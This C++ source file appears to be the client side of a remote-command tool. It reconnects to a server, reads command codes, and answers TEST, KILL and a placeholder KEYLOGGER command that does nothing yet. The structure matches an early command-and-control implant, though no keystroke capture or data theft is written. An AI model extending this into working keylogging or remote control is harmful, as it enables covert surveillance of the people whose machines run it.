#include "client.hpp"


Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
    for (int i=0; i<MAX_IP_LEN; i++) {
        ip_[i] = __ip[i];
        if (__ip[i] == '\0') {
            break;
        }
    }

    if (init() < 0) {
        return;
    }

    start();
}

void Client::send_out(Status __status) {
    char buf[OUT_SIZE];
    
    memcpy(buf, OUT_KEY, OUT_KEY_LEN);
    
    // Little endian format
    buf[OUT_KEY_LEN] = static_cast<char>(__status & 0XFF);
    buf[OUT_KEY_LEN + 1] = static_cast<char>((__status >> 8) & 0XFF);
    
    int rc = send(socket_, buf, OUT_SIZE, 0);
    if (rc < 0) {
        printf("Error sending data: %s\n", strerror(errno));
        retry_flag_ = true;
    } else if (rc == 0) {
        printf("Server closed connection\n");
        retry_flag_ = true;
    } else {
        printf("Sent %d bytes to server\n", rc);
    }
}

int Client::init() {
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("Invalid address or address not supported\n");
        return -1;
    }

    printf("Initializing successful\n");
    return 0;
}

void Client::start() {
    uint16_t command;
    char buffer[OUT_SIZE];
    int bytes_received = 0;
    int bytes_sent = 0;
    int error = 0;
    socklen_t len = sizeof(error);
    CommandCode command_code = 0;
    int command_arg = 0;

    while (!shutdown_flag_) {
        retry_flag_ = false;
        
        socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_ < 0) {
            printf("Socket creation failed: %s\n", strerror(errno));
            goto retry;
        }

        if (connect(socket_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("Trying to connect to the server\n");
                goto retry;
            } else {
                printf("Connection failed: %s\n", strerror(errno));
                return;
            }
        }
        
        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("Connected to server %s:%d\n", ip_, port_);
        while (!retry_flag_) {
            bytes_received = recv(socket_, &command, sizeof(command), 0);
            if (bytes_received < 0) {
                printf("Error receiving data\n");
                break;
            } else if (bytes_received == 0) {
                printf("Server closed connection\n");
                break;
            }

            command_code = static_cast<CommandCode>(command >> 8);
            command_arg = static_cast<int>(command & 0x00FF);
            switch (command_code) {
                case TEST:
                    printf("Received TEST command\n");
                    send_out(EXEC_SUCCESS);
                    break;
                case KILL:
                    printf("Received KILL command\n");
                    send_out(EXEC_SUCCESS);
                    shutdown_flag_ = true;
                    retry_flag_ = true;
                    break;
                case KEYLOGGER:
                    printf("Received KEYLOGGER command\n");
                    break;
                default:
                    printf("Unknown command: %d\n", command_code);
                    send_out(EXEC_ERROR);
                    break;
            }
        }
        retry:
            if (!shutdown_flag_) {
                sleep(1);
                if (socket_ >= 0) {
                    close(socket_);
                }
                continue;
            }
    }
}

void Client::shutdown() {
    printf("Shutting down client\n");
    close(socket_);
}